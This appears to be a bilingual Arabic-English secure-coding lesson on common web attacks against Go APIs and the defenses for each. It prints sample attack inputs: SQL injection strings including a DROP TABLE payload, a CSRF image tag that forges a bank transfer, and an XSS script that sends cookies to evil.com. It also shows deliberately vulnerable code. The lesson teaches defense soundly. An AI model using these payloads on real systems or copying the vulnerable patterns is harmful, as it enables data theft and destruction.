# Lesson 5: Common Attacks - الهجمات الشائعة وكيفية الحماية 🛡️

<div dir="rtl">

## المقدمة

هنتعرف على أشهر الهجمات على الـ Web Applications وإزاي نحمي الـ API منها.

**المدة المتوقعة:** 25 دقيقة

</div>

---

## 1️⃣ SQL Injection

### The Attack

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SQL Injection                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Vulnerable Code:                                                    │
│  ────────────────                                                    │
│  query := "SELECT * FROM users WHERE email = '" + email + "'"       │
│                                                                      │
│  Normal Input:                                                       │
│  email = "ahmed@test.com"                                           │
│  Query: SELECT * FROM users WHERE email = 'ahmed@test.com'          │
│  Result: ✅ Gets Ahmed's data                                       │
│                                                                      │
│  Malicious Input:                                                    │
│  email = "' OR '1'='1"                                              │
│  Query: SELECT * FROM users WHERE email = '' OR '1'='1'             │
│  Result: ⚠️ Gets ALL users!                                         │
│                                                                      │
│  Destructive Input:                                                  │
│  email = "'; DROP TABLE users; --"                                  │
│  Query: SELECT * FROM users WHERE email = '';                       │
│         DROP TABLE users; --'                                       │
│  Result: 💥 Database destroyed!                                      │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Prevention

```go
// ❌ VULNERABLE: String concatenation
func GetUserUnsafe(email string) (*User, error) {
    query := "SELECT * FROM users WHERE email = '" + email + "'"
    return db.Query(query)  // SQL Injection possible!
}

// ✅ SAFE: Parameterized queries
func GetUserSafe(email string) (*User, error) {
    query := "SELECT * FROM users WHERE email = $1"
    return db.QueryRow(query, email)  // Safe!
}

// ✅ SAFE: Using ORM (GORM)
func GetUserGorm(email string) (*User, error) {
    var user User
    return db.Where("email = ?", email).First(&user)  // Safe!
}

// ✅ SAFE: Prepared statements
stmt, _ := db.Prepare("SELECT * FROM users WHERE email = $1")
defer stmt.Close()
stmt.QueryRow(email)  // Safe!
```

---

## 2️⃣ Cross-Site Scripting (XSS)

### The Attack

```
┌─────────────────────────────────────────────────────────────────────┐
│                    XSS Attack                                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Types:                                                              │
│  ──────                                                              │
│  1. Stored XSS: Script saved in database                            │
│  2. Reflected XSS: Script in URL parameter                          │
│  3. DOM XSS: Script manipulates DOM                                 │
│                                                                      │
│  Stored XSS Example:                                                 │
│  ───────────────────                                                 │
│  User posts comment: <script>                                       │
│    fetch('https://evil.com/steal?cookie='+document.cookie)         │
│  </script>                                                          │
│                                                                      │
│  Other users view page → Script executes → Cookies stolen!         │
│                                                                      │
│  What Attacker Can Do:                                               │
│  ─────────────────────                                               │
│  • Steal session cookies                                             │
│  • Redirect to phishing site                                        │
│  • Modify page content                                               │
│  • Keylog user input                                                 │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Prevention

```go
import (
    "html"
    "github.com/microcosm-cc/bluemonday"
)

// For API responses (JSON): Data is auto-escaped by JSON encoder
// But if rendering HTML:

// ❌ VULNERABLE: Raw output
func RenderComment(comment string) string {
    return "<div>" + comment + "</div>"  // XSS possible!
}

// ✅ SAFE: Escape HTML
func RenderCommentSafe(comment string) string {
    return "<div>" + html.EscapeString(comment) + "</div>"
}

// ✅ SAFE: Sanitize (allow some HTML)
func RenderCommentSanitized(comment string) string {
    p := bluemonday.UGCPolicy()
    return "<div>" + p.Sanitize(comment) + "</div>"
}

// ✅ For APIs: Set proper Content-Type
func GetData(c *gin.Context) {
    c.Header("Content-Type", "application/json")  // Not text/html
    c.JSON(200, data)
}

// ✅ Use Content-Security-Policy header
c.Header("Content-Security-Policy", "default-src 'self'")
```

---

## 3️⃣ Cross-Site Request Forgery (CSRF)

### The Attack

```
┌─────────────────────────────────────────────────────────────────────┐
│                    CSRF Attack                                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Scenario:                                                           │
│  ─────────                                                           │
│  1. User logged into bank.com (has session cookie)                  │
│  2. User visits evil-site.com (in another tab)                      │
│  3. Evil site has:                                                   │
│     <img src="https://bank.com/transfer?to=hacker&amount=10000">   │
│  4. Browser sends request with bank.com cookies!                   │
│  5. Transfer happens without user's knowledge                       │
│                                                                      │
│  Why It Works:                                                       │
│  ──────────────                                                      │
│  Browser automatically sends cookies with requests                  │
│  Server can't distinguish legitimate vs forged request              │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Prevention

```go
// For APIs with token auth (JWT in header):
// ✅ CSRF not applicable - tokens not auto-sent

// For cookie-based auth:

// 1. SameSite Cookie Attribute
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    SameSite: http.SameSiteStrictMode,  // Prevents CSRF
    Secure:   true,
    HttpOnly: true,
})

// 2. CSRF Token (for forms)
import "github.com/gorilla/csrf"

func main() {
    r := mux.NewRouter()

    // CSRF middleware
    csrfMiddleware := csrf.Protect(
        []byte("32-byte-long-auth-key"),
        csrf.Secure(true),
    )

    r.HandleFunc("/form", showForm)
    r.HandleFunc("/submit", handleSubmit).Methods("POST")

    http.ListenAndServe(":8080", csrfMiddleware(r))
}

// In form template:
// <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">

// 3. Verify Origin/Referer header
func CSRFCheck(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method != "GET" && r.Method != "HEAD" {
            origin := r.Header.Get("Origin")
            if origin == "" {
                origin = r.Header.Get("Referer")
            }
            if !strings.HasPrefix(origin, "https://myapp.com") {
                http.Error(w, "CSRF detected", 403)
                return
            }
        }
        next.ServeHTTP(w, r)
    })
}
```

---

## 4️⃣ Broken Access Control

### The Attack

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Broken Access Control                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  IDOR (Insecure Direct Object Reference):                           │
│  ─────────────────────────────────────────                           │
│  User 123 requests: GET /api/orders/456                             │
│  Server returns order 456... but it belongs to user 789!           │
│                                                                      │
│  Horizontal Privilege Escalation:                                    │
│  ────────────────────────────────                                    │
│  Normal user accesses another user's data                           │
│                                                                      │
│  Vertical Privilege Escalation:                                      │
│  ───────────────────────────────                                     │
│  Normal user accesses admin functions                               │
│  GET /api/admin/users ← Should be admin only!                      │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Prevention

```go
// ❌ VULNERABLE: No ownership check
func GetOrder(c *gin.Context) {
    orderID := c.Param("id")
    order, _ := db.FindOrder(orderID)
    c.JSON(200, order)  // Anyone can view any order!
}

// ✅ SAFE: Verify ownership
func GetOrder(c *gin.Context) {
    userID := c.GetInt("user_id")  // From auth middleware
    orderID := c.Param("id")

    order, err := db.FindOrder(orderID)
    if err != nil {
        c.JSON(404, gin.H{"error": "Order not found"})
        return
    }

    // Check ownership
    if order.UserID != userID {
        c.JSON(403, gin.H{"error": "Access denied"})
        return
    }

    c.JSON(200, order)
}

// ✅ Or query with user filter
func GetOrders(c *gin.Context) {
    userID := c.GetInt("user_id")
    orders := db.FindOrdersByUser(userID)  // Only their orders
    c.JSON(200, orders)
}

// ✅ Admin route protection
func AdminOnly() gin.HandlerFunc {
    return func(c *gin.Context) {
        role := c.GetString("user_role")
        if role != "admin" {
            c.AbortWithStatusJSON(403, gin.H{"error": "Admin access required"})
            return
        }
        c.Next()
    }
}

// Apply to admin routes
admin := r.Group("/admin")
admin.Use(AuthMiddleware(), AdminOnly())
{
    admin.GET("/users", listAllUsers)
    admin.DELETE("/users/:id", deleteUser)
}
```

---

## 5️⃣ Security Misconfiguration

```
┌─────────────────────────────────────────────────────────────────────┐
│                Common Misconfigurations                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ❌ Debug mode in production                                         │
│     Stack traces exposed                                            │
│                                                                      │
│  ❌ Default credentials                                              │
│     admin/admin still works                                         │
│                                                                      │
│  ❌ Unnecessary endpoints exposed                                    │
│     /debug/pprof, /metrics without auth                            │
│                                                                      │
│  ❌ Verbose error messages                                           │
│     "Error: Table 'users' column 'ssn' not found"                  │
│                                                                      │
│  ❌ Directory listing enabled                                        │
│     List all files in /uploads                                     │
│                                                                      │
│  ❌ Missing security headers                                         │
│     No CSP, HSTS, X-Frame-Options                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Prevention

```go
// ✅ Environment-based config
func main() {
    if os.Getenv("ENV") == "production" {
        gin.SetMode(gin.ReleaseMode)
    }

    r := gin.New()

    // Don't use gin.Default() in production
    // It includes Logger and Recovery that may leak info

    r.Use(gin.Recovery())  // Custom recovery

    // Custom error handler
    r.Use(func(c *gin.Context) {
        c.Next()

        if len(c.Errors) > 0 {
            // Log full error internally
            log.Printf("Error: %v", c.Errors)

            // Return generic error to client
            if os.Getenv("ENV") == "production" {
                c.JSON(500, gin.H{"error": "Internal server error"})
            } else {
                c.JSON(500, gin.H{"error": c.Errors.String()})
            }
        }
    })
}

// ✅ Disable debug endpoints in production
if os.Getenv("ENV") != "production" {
    r.GET("/debug/pprof/*any", gin.WrapH(http.DefaultServeMux))
}
```

---

## 6️⃣ Quick Reference

```
┌─────────────────────────────────────────────────────────────────────┐
│                Attack Prevention Cheat Sheet                         │
├──────────────────────┬──────────────────────────────────────────────┤
│ Attack               │ Prevention                                   │
├──────────────────────┼──────────────────────────────────────────────┤
│ SQL Injection        │ Parameterized queries, ORM                  │
│ XSS                  │ Escape output, CSP header, sanitize input  │
│ CSRF                 │ CSRF token, SameSite cookie, verify origin │
│ Broken Access        │ Check ownership, RBAC, least privilege     │
│ Security Misconfig   │ No debug in prod, generic errors           │
│ Sensitive Data       │ HTTPS, encrypt at rest, mask in logs       │
│ Brute Force          │ Rate limiting, account lockout, CAPTCHA    │
│ Path Traversal       │ Validate paths, use whitelists             │
│ Command Injection    │ Avoid shell exec, use libraries            │
│ XXE                  │ Disable external entities in XML parser    │
└──────────────────────┴──────────────────────────────────────────────┘
```

---

## ✅ Key Takeaways

<div dir="rtl">

- ✅ **SQL Injection** = استخدم parameterized queries دايماً
- ✅ **XSS** = escape/sanitize الـ output + CSP headers
- ✅ **CSRF** = SameSite cookies + CSRF tokens
- ✅ **Access Control** = verify ownership on every request
- ✅ **Generic errors** في production
- ✅ **Defense in depth** = multiple layers of protection

</div>

---

## ⏭️ Next Lesson

<div dir="rtl">

**➡️ [Lesson 6: Security Headers](./06-security-headers.md)**

</div>

---

<div align="center">

[⬅️ Previous: Input Validation](./04-input-validation.md) | [📚 Module Home](../README.md) | [➡️ Next: Security Headers](./06-security-headers.md)

</div>
